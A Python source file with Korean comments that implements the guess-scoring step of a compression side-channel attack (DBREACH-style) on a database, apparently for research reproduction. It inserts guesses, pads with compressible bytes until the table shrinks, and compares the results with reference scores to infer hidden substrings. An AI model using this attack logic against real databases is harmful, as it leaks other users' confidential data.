# decision_attacker.py
import dbreacher
from typing import Iterable, List, Tuple, Dict, Optional

class decisionAttacker:
    """
    각 guess g에 대해:
      - b(g): 현재 세팅에서 shrink까지 필요한 '압축 바이트 수'
      - b_no(L): 길이 L의 랜덤 참조(미존재) 점수
      - b_yes(L): 길이 L의 존재 참조(이미 페이지에 있는 서브스트링) 점수
    를 구하고, 필요 시 min-정규화하여 반환.
    """
    def __init__(self,
                 dbreacher: dbreacher.DBREACHer,
                 guesses: List[str],
                 fillerCharSet: Optional[Iterable[str]] = None):
        self.dbreacher = dbreacher
        self.guesses = list(guesses)
        # 길이별 참조 캐시
        self._b_yes: Dict[int, float] = {}
        self._b_no: Dict[int, float] = {}
        # 개별 guess 점수
        self._b_guess: Dict[str, float] = {}
        # 랜덤 참조 생성 시 사용할 charset (실험의 filler와 동일 분포를 권장)
        if fillerCharSet is None:
            # 안전한 기본값 (호출 측에서 넘겨주는 걸 권장)
            fillerCharSet = self.dbreacher.fillerCharSet
        self._fillerSeq = list(fillerCharSet)

    def setUp(self) -> bool:
        """페이지 경계 세팅. 실패시 False(호출측에서 루프 돌려 재시도)."""
        # 이전 결과 초기화
        self._b_guess.clear()
        self._b_yes.clear()
        self._b_no.clear()
        return self.dbreacher.reinsertFillers()

    def _ensure_refs(self, L: int) -> bool:
        """길이 L에 대한 참조(b_yes, b_no)를 캐시. 실패시 False."""
        if L not in self._b_yes:
            try:
                self._b_yes[L] = self.dbreacher.getSYesReferenceScore(L)
            except RuntimeError:
                return False
        if L not in self._b_no:
            try:
                self._b_no[L] = self.dbreacher.getSNoReferenceScore(L, self._fillerSeq)
            except RuntimeError:
                return False
        return True

    def tryAllGuesses(self, verbose: bool = False) -> bool:
        """
        각 guess를 시험.
        - guess 자체로 shrink가 나면 세팅이 깨진 것이므로 False(재세팅 필요).
        - 정상측정 완료시 True.
        """
        for g in self.guesses:
            L = len(g)
            if not self._ensure_refs(L):
                return False

            shrunk = self.dbreacher.insertGuessAndCheckIfShrunk(g)
            if shrunk:
                # guess만으로 shrink → 경계 세팅 실패로 간주
                if verbose:
                    print(f"[WARN] table shrunk too early on guess: {g}")
                return False

            while not shrunk:
                shrunk = self.dbreacher.addCompressibleByteAndCheckIfShrunk()

            b = self.dbreacher.getBytesShrunkForCurrentGuess()
            if b is None:
                return False
            self._b_guess[g] = float(b)
            if verbose:
                print(f'guess="{g}" bytesShrunk={b}')
        return True

    def getGuessAndReferenceScores(self, normalize_min: bool = True
                                  ) -> List[Tuple[str, Tuple[float, float, float]]]:
        """
        각 guess에 대해 (b_no, b_guess, b_yes) 튜플을 반환.
        normalize_min=True면 min(b_no, b, b_yes)를 0으로 맞춰 정규화(차이는 보존됨).
        """
        out: List[Tuple[str, Tuple[float, float, float]]] = []
        for g, b in self._b_guess.items():
            L = len(g)
            b_no = float(self._b_no[L])
            b_yes = float(self._b_yes[L])
            if normalize_min:
                m = min(b_no, b, b_yes)
                out.append((g, (b_no - m, b - m, b_yes - m)))
            else:
                out.append((g, (b_no, b, b_yes)))
        return out

    # 필요 시: 원시 guess 점수만
    def getGuessScores(self) -> Dict[str, float]:
        return dict(self._b_guess)
